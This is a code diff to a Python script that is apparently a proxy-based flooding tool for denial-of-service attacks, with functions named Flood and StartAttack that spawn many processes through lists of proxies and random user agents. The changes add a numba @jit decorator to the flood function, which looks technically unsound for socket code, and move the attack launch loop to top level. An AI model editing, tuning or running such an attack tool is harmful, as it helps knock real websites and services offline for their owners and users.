@@ -1,3 +1,4 @@
+from numba import jit
 import ssl
 import multiprocessing, threading
 import socket
@@ -99,7 +100,7 @@ def checkProxies():
     f.close()
 
 time.sleep(1)
-
+@jit
 def Flood(indexPicker):
     if indexPicker < len(proxies):
         proxy = proxies[indexPicker].strip().split(":")
@@ -155,9 +156,7 @@ userAgentList = []
 for _ in range(100):
     userAgent = UserAgent().random
     userAgentList.append(userAgent)
-def StartAttack():
-    for indexPicker in range(threadNumber):
-        thread = multiprocessing.Process(target=Flood, args=(indexPicker, ))
-        thread.setDaemon = False
-        thread.start()
-StartAttack()
+for indexPicker in range(threadNumber):
+    thread = multiprocessing.Process(target=Flood, args=(indexPicker, ))
+    thread.setDaemon = False
+    thread.start()
